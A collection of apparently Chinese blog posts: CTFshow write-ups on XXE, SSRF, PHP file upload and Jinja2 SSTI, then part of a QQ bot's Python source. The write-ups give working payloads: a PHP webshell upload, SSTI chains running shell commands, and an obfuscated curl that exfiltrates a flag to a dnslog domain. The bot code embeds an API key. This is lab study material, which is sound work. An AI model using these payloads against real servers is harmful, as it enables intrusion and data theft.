[{"title":"CTFshowXXE","url":"/posts/949d2db6.html","content":"\n## XML基础知识\n\n要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成。\n\n> XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素\n\n### xml文档的构建模块\n\n所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：\n\n- 元素\n- 属性\n- 实体\n- PCDATA\n- CDATA\n\n下面是每个构建模块的简要描述。\n1，元素\n元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。\n实例:\n\n```\n<body>body text in between</body>\n<message>some message in between</message>12\n```\n\n空的 HTML 元素的例子是 \"hr\"、\"br\" 以及 \"img\"。\n\n2，属性\n属性可提供有关元素的额外信息\n实例：\n\n```\n<img src=\"computer.gif\" />1\n```\n\n3，实体\n实体是用来定义普通文本的变量。实体引用是对实体的引用。\n\n4，PCDATA\nPCDATA 的意思是被解析的字符数据（parsed character data）。\nPCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。\n\n5，CDATA\nCDATA 的意思是字符数据（character data）。\nCDATA 是不会被解析器解析的文本。\n\n### DTD(文档类型定义)\n\nDTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。\n\nDTD 可以在 XML 文档内声明，也可以外部引用。\n\n1，内部声明：<!DOCTYPE 根元素 [元素声明]> ex: `<!DOCTYOE test any>`\n完整实例：\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [\n  <!ELEMENT note (to,from,heading,body)>\n  <!ELEMENT to      (#PCDATA)>\n  <!ELEMENT from    (#PCDATA)>\n  <!ELEMENT heading (#PCDATA)>\n  <!ELEMENT body    (#PCDATA)>\n]>\n<note>\n  <to>George</to>\n  <from>John</from>\n  <heading>Reminder</heading>\n  <body>Don't forget the meeting!</body>\n</note>1234567891011121314\n```\n\n2，外部声明（引用外部DTD）：<!DOCTYPE 根元素 SYSTEM \"文件名\"> ex:`<!DOCTYPE test SYSTEM 'http://www.test.com/evil.dtd'>`\n完整实例:\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note SYSTEM \"note.dtd\">\n<note>\n<to>George</to>\n<from>John</from>\n<heading>Reminder</heading>\n<body>Don't forget the meeting!</body>\n</note> \n```\n\n而note.dtd的内容为:\n\n```\n<!ELEMENT note (to,from,heading,body)>\n<!ELEMENT to (#PCDATA)>\n<!ELEMENT from (#PCDATA)>\n<!ELEMENT heading (#PCDATA)>\n<!ELEMENT body (#PCDATA)>\n```\n\n### DTD实体\n\nDTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。\n***\n实体又分为一般实体和参数实体\n1，一般实体的声明语法:<!ENTITY 实体名 \"实体内容“>\n引用实体的方式：&实体名；\n2，参数实体只能在DTD中使用，参数实体的声明格式： <!ENTITY % 实体名 \"实体内容“>\n引用实体的方式：%实体名；\n\\***\n\n1，内部实体声明:<!ENTITY 实体名称 \"实体的值\"> ex:`<!ENTITY eviltest \"eviltest\">`\n完整实例:\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE test [\n<!ENTITY writer \"Bill Gates\">\n<!ENTITY copyright \"Copyright W3School.com.cn\">\n]>\n123456\n```\n\n<test>&writer;©right;</test>\n\n**2，外部实体声明:<!ENTITY 实体名称 SYSTEM \"URI\">**\n完整实例:\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE test [\n<!ENTITY writer SYSTEM \"http://www.w3school.com.cn/dtd/entities.dtd\">\n<!ENTITY copyright SYSTEM \"http://www.w3school.com.cn/dtd/entities.dtd\">\n]>\n<author>&writer;&copyright;</author>123456\n```\n\n在了解了基础知识后，下面开始了解xml外部实体注入引发的问题\n","tags":["CTF","web"]},{"title":"CTFshowSSRF","url":"/posts/b1fc6cca.html","content":"\n## SSRF基础\n\nSSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\n\n## 相关函数和类\n\nfile_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中\nreadfile()：输出一个文件的内容\nfsockopen()：打开一个网络连接或者一个Unix 套接字连接\ncurl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用\nfopen()：打开一个文件文件或者 URL\nPHP原生类SoapClient在触发反序列化时可导致SSRF\n\n## 相关协议\n\nfile协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容\ndict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等\ngopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell\nhttp/s协议：探测内网主机存活\n\n\n\n**351**\n\n```PHP\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n?>\n# curl_init — 初始化 cURL 会话    \n# curl_setopt — 设置一个cURL传输选项\n# curl_exec — 执行 cURL 会话\n# curl_close — 关闭 cURL 会话\n```\n\n\n\n```\npayload:\nPOST:\nurl=http://127.0.0.1/flag.php\n```\n\n**352**\n\n`parse_url`函数作用是将一个URL拆分，格式如下：\n\n```PHP\n<?php\n$url = 'http://username:password@hostname/path?arg=value#anchor';\nprint_r(parse_url($url));\n?>\n以上例程会输出：\nArray\n(\n[scheme] => http\n[host] => hostname\n[user] => username\n[pass] => password\n[path] => /path\n[query] => arg=value\n[fragment] => anchor\n)\n```\n\n同上即可\n\n**353**\n\n绕过127.0.0.1，可使用进制转换或其他IP\n\n```\n进制转换：\n整数转换过程，将每一位IP转换为二进制并进行拼接\n2130706433 //十进制整数\n0x7F.0.0.1 //十六进制\n0177.0.0.1 //八进制\n0x7F000001 //十六进制整数\n```\n\n```\n其他IP：\n127.127.127.127\n0\n0.0.0.0\n```\n\n**354**\n\n过滤没了，只能指向其他域名\n\n1、将自己域名解析为127.0.0.1\n\n2、将自己网站设置为302重定向到127.0.0.1\n\n**355**\n\n用0或者127.1\n\n0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0\n\n**356**\n\n更短了只能用0\n\n**357**\n\n```PHP\ngethostbyname — 返回主机名对应的 IPv4地址\n# php filter函数\nfilter_var()\t获取一个变量，并进行过滤\nfilter_var_array()\t获取多个变量，并进行过滤\n......\n# PHP 过滤器\nFILTER_VALIDATE_IP\t把值作为 IP 地址来验证，只限 IPv4 或 IPv6 或 不是来自私有或者保留的范围\nFILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）\nFILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）\nFILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）\nFILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。\n```\n\n由于获取到了指向域名的IP值所以域名指向127.0.0.1不再生效，只能使用302重定向或者**DNS rebinding（DNS重新绑定攻击）**\n\n### DNS rebinding：\n\n```\n攻击重点在于DNS服务能够在两次DNS查询中返回不用的IP地址，第一次是真正的IP，第二次是攻击目标IP地址，甚至可以通过这种攻击方法绕过同源策略\n回到题目，在题目代码中一共对域名进行了两次请求，第一次是 gethostbyname 方法，第二次则是 file_get_contents 文件读取，可以通过 ceye.io 来实现攻击，DNS Rebinding 中设置两个 IP，一个是 127.0.0.1 另一个是随便可以访问的 IP\n```\n\n**358**\n\n正则匹配要求URL以http://ctf.开头，以show结尾\n\n一个完整的URL的格式如下\n\n`http://username:password@hostname/path?arg=value#anchor`\n\n其中hostname就是我们平常使用的网址，我们只需要让username位置为ctf.，让anchor位置为show即可\n\n```\npayload:\nPOST\nurl=http://ctf.@127.0.0.1/flag.php#show\n```\n\n**359**\n\n随便输入个用户名密码尝试登录\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-01 01.12.20.png)\n\n抓包发现returl参数可能存在SSRF注入点，使用Gopherus生成攻击payload\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-01 22.36.11.png)\n\n写入之后访问即可\n\n**360**\n\n同上\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-01 22.44.48.png)\n\n\n\n\n\n","tags":["CTF","web"]},{"title":"CTFshow记录","url":"/posts/82271b5a.html","content":"\n### baby杯——baby_php\n\n审计代码，明显是文件上传\n\n```PHP\nclass fileUtil{\n\n    private $name;\n    private $content;\n\n\n    public function __construct($name,$content=''){\n        $this->name = $name;\n        $this->content = $content;\n        ini_set('open_basedir', '/var/www/html');\n    }\n\n    public function file_upload(){\n        if($this->waf($this->name) && $this->waf($this->content)){\n            return file_put_contents($this->name, $this->content);\n        }else{\n            return 0;\n        }\n    }\n\n    private function waf($input){\n        return !preg_match('/php/i', $input);\n    }\n\n    public function file_download(){\n        if(file_exists($this->name)){\n            header('Content-Type: application/octet-stream');\n            header('Content-Disposition: attachment; filename=\"'.$this->name.'\"');\n            header('Content-Transfer-Encoding: binary');\n            echo file_get_contents($this->name);\n        }else{\n            return False;\n        }\n    }\n\n    public function __destruct(){\n\n    }\n\n}\n\n$action = $_GET['a']?$_GET['a']:highlight_file(__FILE__);\n\nif($action==='upload'){\n    die('Permission denied');\n}\n\nswitch ($action) {\n    case 'upload':\n        $name = $_POST['name'];\n        $content = $_POST['content'];\n        $ft = new fileUtil($name,$content);\n        if($ft->file_upload()){\n            echo $name.' upload success!';\n        }\n        break;\n    case 'download':\n        $name = $_POST['name'];\n        $ft = new fileUtil($name,$content);\n        if($ft->file_download()===False){\n            echo $name.' download failed';\n        }\n        break;\n    default:\n        echo 'baby come on';\n        break;\n}\n```\n\n小知识：$_GET['a']在没有被赋值时默认值时true，case的判定是弱相等\n\n关键代码\n\n```PHP\n$action = $_GET['a']?$_GET['a']:highlight_file(__FILE__);\n\nif($action==='upload'){//a只声明不赋值默认为true，强相等判定无法通过\n    die('Permission denied');\n}\n\nswitch ($action) {\n    case 'upload'://true==\"upload\"，判定结果为真，进入upload上传文件\n```\n\n查看响应头中间件为nginx，上传.user.ini文件来包含，一定要先上传1.txt文件，不然在auto_prepend_file参数生效并且找不到1.txt时整个环境就废了\n\n```\npayload:?a=\nPOST:\ncontent=<?=`$_GET['kkk']`;?>&name=1.txt\nPOST:\ncontent=auto_prepend_file=\"1.txt\"&name=.user.ini\n\npayload:?kkk=tac /flag_baby_here_you_are\n```\n\n","tags":["CTF","web"]},{"title":"CTFshowSSTI","url":"/posts/45647.html","content":"\n**361**\n\n无过滤，参数名为name，直接执行命令即可\n\n```\npayload:?name={{\"\".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac /flag').read()}}\n```\n\n**362**\n\n过滤了数字，使用全角数字代替正常数字\n\n```\npayload:?name={{\"\".__class__.__base__.__subclasses__()[１３２].__init__.__globals__['popen']('tac /flag').read()}}\n```\n\n**363**\n\n过滤了单双引号，可通过request.args传入新参数解决，或者使用chr来绕过\n\n```\n//request.args\npayload:?name={{config.__class__.__init__.__globals__[request.args.a][request.args.b](request.args.c).read()}}&a=os&b=popen&c=tac /flag\n```\n\n```\n//chr\npayload:?name={% set chr=url_for.__globals__.__builtins__.chr %}{{url_for.__globals__[chr(111)%2bchr(115)].popen(chr(116)%2bchr(97)%2bchr(99)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()}}\n```\n\n**364**\n\n过滤了args，无法使用GET传参了，使用~~POST（方法被禁用了）~~或者cookie都可\n\n```\n//cookie\npayload:?name={{config.__class__.__init__.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()}}\nCookie: a=os;b=popen;c=tac /flag;\n```\n\n```\n//chr\npayload:?name={% set chr=url_for.__globals__.__builtins__.chr %}{{url_for.__globals__[chr(111)%2bchr(115)].popen(chr(116)%2bchr(97)%2bchr(99)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()}}\n```\n\n**365**\n\n过滤了中括号，换点\n\n```\n//cookie\npayload:?name={{config.__class__.__init__.__globals__.os.popen(request.cookies.a).read()}}\nCookie: a=tac /flag\n```\n\n**366**\n\n过滤了下划线，这里用attr方法：request|attr(request.cookies.a)等价于request[“a”]\n\n```\npayload:?name={{(config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).os.popen(request.cookies.d).read()}}\nCookie: a=__class__; b=__init__; c=__globals__; d=tac /flag;\n```\n\n他人WP\n\n```\npayload:?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}\nCookie: a=__globals__;b=cat /flag;\n```\n\n**367**\n\n过滤了os，继续用attr\n\n```\npayload:?name={{(config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).get(request.cookies.e).popen(request.cookies.d).read()}}\nCookie: a=__class__; b=__init__; c=__globals__; d=tac /flag; e=os;\n```\n\n**368**\n\n过滤了{undefined{undefined，使用命令方式print\n\n```\npayload:?name={% print((config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).get(request.cookies.e).popen(request.cookies.d).read()) %}\nCookie: a=__class__; b=__init__; c=__globals__; d=tac /flag; e=os;\n```\n\n**369**\n\n过滤了request，没办法传递参量了，使用模版过滤器\n\n```\npayload:?name={% set po=dict(po=a,p=a)|join%}//构造pop，为下方提供_\n{% set a=(()|select|string|list)|attr(po)(24)%}//构造出_\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}//构造出__init__\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}//构造出__globals__\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}//构造出__getitem__\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}//构造出__builtins__\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}//构造出builtins模块\n{% set chr=x.chr%}//使用chr函数\n{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}//构造出字符串/flag\n{%print(x.open(file).read())%}//读文件\n```\n\n**370**\n\n过滤数字用全角，或者使用length，count构造数字\n\n```\npayload:?name=\n{% set po=dict(po=a,p=a)|join%}\n{% set a=(()|select|string|list)|attr(po)(２４)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%}\n{%print(x.open(file).read())%}\n```\n\n**371**\n\nprint回显被禁，dnslog外带\n\n```\n?name={%set po=(dict(po=a,p=a)|join)%}\n{% set ershisi=(dict(eeeeeeeeeeeeeeeeeeeeeeee=a)|join|length)%}\n{% set xiahuaxian=(()|select|string|list)|attr(po)(ershisi)%}\n{% set ur=((dict(ur=a,l=a)|join,xiahuaxian,dict(fo=a,r=a)|join)|join)%}\n{% set glo=((xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join)%}\n{% set ous=(dict(o=a,s=a)|join)%}\n{% set ouuu=(ur|attr(glo)|attr(ous))%}\n```\n\n```\n?name={%set a=dict(po=aa,p=aa)|join%}{%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%}{%set k=dict(eeeeeeeee=a)|join|length%}{%set l=dict(eeeeeeee=a)|join|length%}{%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%}{%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%}{% set b=(lipsum|string|list)|attr(a)(j)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{% set f=(lipsum|string|list)|attr(a)(k)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%}{%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%}{%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%}{%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(czducq=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%}{%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%}{%endif%}\n```\n\n**372**\n\ncount换成length\n\n```\n?name={%set a=dict(po=aa,p=aa)|join%}{%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%}{%set k=dict(eeeeeeeee=a)|join|length%}{%set l=dict(eeeeeeee=a)|join|length%}{%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%}{%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%}{% set b=(lipsum|string|list)|attr(a)(j)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{% set f=(lipsum|string|list)|attr(a)(k)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%}{%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%}{%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%}{%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(czducq=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%}{%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%}{%endif%}\n```\n\n","tags":["CTF","web","SSTI"]},{"title":"罗伯特","url":"/posts/61106.html","content":"\n```python\n#bot.py\nfrom unittest.mock import NonCallableMagicMock\nfrom flask import Flask, request\nimport requests\nimport api\napp = Flask(__name__)\n\n'''监听端口，获取QQ信息'''\n@app.route('/', methods=[\"POST\"])\ndef post_data():\n    '下面的request.get_json().get......是用来获取关键字的值用的，关键字参考上面代码段的数据格式'\n    if request.get_json().get('message_type')=='private':\n        uid = request.get_json().get('sender').get('user_id')\n        message = request.get_json().get('raw_message')\n        api.keywordForPerson(message,uid)\n    if request.get_json().get('message_type')=='group':\n        gid = request.get_json().get('group_id')\n        uid = request.get_json().get('sender').get('user_id')\n        message = request.get_json().get('raw_message')\n        nick=request.get_json().get('sender').get('nickname')\n        role=request.get_json().get('sender').get('role')\n        api.keywordForGroup(message, gid, uid,nick,role)\n    return 'OK'\n\n\nif __name__ == '__main__':\n    app.run(debug=True, host='127.0.0.1', port=5701)\n\n```\n\n```python\n#api.py\nimport person\nimport group\nimport requests\nimport re\nimport time\nimport json\nimport random\n\n\n\ndef help():\n    return \"天气：输入天气 地名，获取当地天气，默认为徐州天气\\n双色球：输入双色球查看最新一期双色球开奖信息以及奖池累计金额\\n扔瓶子：私聊罗伯特并发送以下内容：\\n扔瓶子 发送者（可填匿名） 接受者（可填空） 内容\\n来扔瓶子\\n捞瓶子：发送捞瓶子来捞别人扔的瓶子\\n帮助：输入/help，获取帮助\"\ndef weather(message):\n    try:\n        city=message.split(' ')[1]\n    except:\n        city='徐州'\n    try:\n        ercode=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city,timeout=1).text\n    except:\n        return \"罗伯特被学校关起来了呜呜\"\n    if \"invilad-citykey\" in ercode:\n        return \"抱歉，您的输入有误，请检查后再试\"\n    weatherInfo=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city).json()['data']['forecast'][0]\n    ganmao=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city).json()['data']['ganmao']\n    fl=re.search(r\"[0-9]+\",weatherInfo['fengli']).group(0)\n    hi=re.search(r\"[0-9]+\",weatherInfo['high']).group(0)\n    lo=re.search(r\"[0-9]+\",weatherInfo['low']).group(0)\n    weatherInfo=f\"今日{city}天气{weatherInfo['type']}，最高温度{hi}℃，最低温度{lo}℃，{weatherInfo['fengxiang']}{fl}级\\n温馨提示，{ganmao}\"\n    return weatherInfo\ndef buquan(message,uid):\n    #计算括号数量并自动补全\n    def countBracket(message):\n        countban=0\n        for i in message:\n            if i=='(':\n                countban+=1\n            if i==')':\n                countban-=1\n        countquan=0\n        for i in message:\n            if i=='（':\n                countquan+=1\n            if i=='）':\n                countquan-=1\n        return {'ban':countban,'quan':countquan}\n    #自动补全括号\n    ban=countBracket(message)['ban']\n    quan=countBracket(message)['quan']\n    bu=\"\"\n    if not (ban or quan):\n        return\n    if ban>0:\n        for i in range(ban):\n            bu+=')'\n    elif ban<0:\n        for i in range(-ban):\n            bu+='('\n    if quan>0:\n        for i in range(quan):\n            bu+='）'\n    elif quan<0:\n        for i in range(-quan):\n            bu+='（'\n    print(bu+f\"[CQ:at,qq={uid}]帮你补括号\")\n    return bu+f\"[CQ:at,qq={uid}]帮你补括号\"\ndef theDoubleChromosphere(uid):\n    tex=requests.get(\"http://www.cwl.gov.cn/fcpz/yxjs/ssq/\").text\n    #获取红球\n    red=re.search(r\"<div class=\\\"ssqRed-dom\\\">\\[(.*?)\\]</div>\",tex).group(1)\n    red=red.split(',')\n    #获取蓝球\n    blue=re.search(r\"<div class=\\\"ssqBlue-dom\\\">\\[(.*?)\\]</div>\",tex).group(1)\n    blue=blue.split(',')\n    #获取期号\n    qh=re.search(r\"<div class=\\\"ssqQh-dom\\\">(.*?)</div>\",tex).group(1)\n    #获取奖池\n    pool=re.search(r\"<div class=\\\"ssqPool-dom\\\">(.*?)</div>\",tex).group(1)\n    return f\"第{qh}期开奖结果为：\\n红球：{red}\\n蓝球：{blue}\\n奖池：{pool}\\n[CQ:at,qq={uid}]害搁着等着干啥呢，赶紧买彩票去啊\"\ndef sign(gid,uid,nick):\n    today=time.strftime(\"%Y-%m-%d\",time.localtime())\n    groupUserInfo=group.readGroupUserInfo()\n    try:\n        thisGroupUserInfo=groupUserInfo[str(gid)]\n    except:\n        thisGroupUserInfo={}\n        thisGroupUserInfo[str(uid)]={\"nick\": nick, \"point\": 0, \"signTime\": \"\", \"ban\": False}\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        thisUser={\"nick\": nick, \"point\": 0, \"signTime\": \"\", \"ban\": False}\n        thisGroupUserInfo[str(uid)]=thisUser\n    if thisUser['signTime']==today:\n        return f\"[CQ:at,qq={uid}]您今天已经签到过了，明天再来吧\"\n    else:\n        thisUser['point']+=1\n        thisUser['signTime']=today\n        group.saveGroupUserInfo(groupUserInfo)\n        return f\"[CQ:at,qq={uid}]签到成功，您的积分为{thisUser['point']}，明天再来吧\"\ndef getQQ(message):\n    try:\n        qq=re.search(r\"qq=(\\d+)\",message).group(1)\n    except:\n        qq=None\n    return qq\ndef ban(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    thisUser=thisGroupUserInfo[str(uid)]\n    thisUser['ban']=True\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"好，我们不和[CQ:at,qq={uid}]玩\"\ndef unban(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    thisUser=thisGroupUserInfo[str(uid)]\n    thisUser['ban']=False\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"好吧，我原谅你了[CQ:at,qq={uid}]\"\ndef keywordForPerson(message, uid):\n    if message[0:2]=='天气':\n        person.sendMessage(weather(message),uid)\ndef isBan(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        if thisUser['ban']:\n            return True\n        else:\n            return False\n    except:\n        return False\ndef point(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        return f\"[CQ:at,qq={uid}]您的积分为{thisUser['point']}\"\n    except:\n        return f\"[CQ:at,qq={uid}]请先签到后重试\"\ndef isAdmin(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        if thisUser['admin']:\n            return True\n        else:\n            return False\n    except:\n        return False\ndef giveAdmin(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        thisUser={\"nick\": \"nick\", \"point\": 0, \"signTime\": \"\", \"ban\": False}\n    thisUser['admin']=True\n    thisGroupUserInfo[str(uid)]=thisUser\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"没问题，以后我就听你的啦[CQ:at,qq={uid}]\"\ndef today(message):\n    try:\n        message=message.split(' ')\n        message=message[1]\n    except:\n        message=None\n        return f\"请输入运势 星座来查询今日运势\"\n    if len(message)==2:\n        message=message+\"座\"\n    url=\"http://web.juhe.cn:8080/constellation/getAll\"\n    params={\n        \"key\":\"4a11bbcbf089edaf14c2d9bdb80c2ec4\",\n        \"consName\":message,\n        \"type\":\"today\"\n    }\n    ys=requests.get(url=url,params=params).json()\n    return f\"{ys['name']}今日运势：\\n综合指数：{ys['all']}%\\n幸运色：{ys['color']}\\n健康指数：{ys['health']}%\\n爱情指数：{ys['love']}%\\n财运指数：{ys['money']}%\\n工作指数：{ys['work']}%\\n幸运数字：{ys['number']}\\n适配星座：{ys['QFriend']}\\n总结：{ys['summary']}\"\ndef minusPoint(gid,uid,point):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        return f\"[CQ:at,qq={uid}]请先签到后重试\"\n    if thisUser['point']-point < 0:\n        return f\"[CQ:at,qq={uid}]您的积分不足\"\n    thisUser['point']-=point\n    thisGroupUserInfo[str(uid)]=thisUser\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return \"OK\"\ndef throwBottle(uid,message):\n    try:\n        me=message.split(\" \",3)\n        send=me[1]\n        rec=me[2]\n        con=me[3]\n        with open('bottle.json','r') as f:\n            bottle = json.load(f)\n        nb={\n            \"QQ\":str(uid),\n            \"send\":send,\n            \"rec\":rec,\n            \"con\":con\n        }\n        bottle.append(nb)\n        with open('bottle.json','w') as f:\n            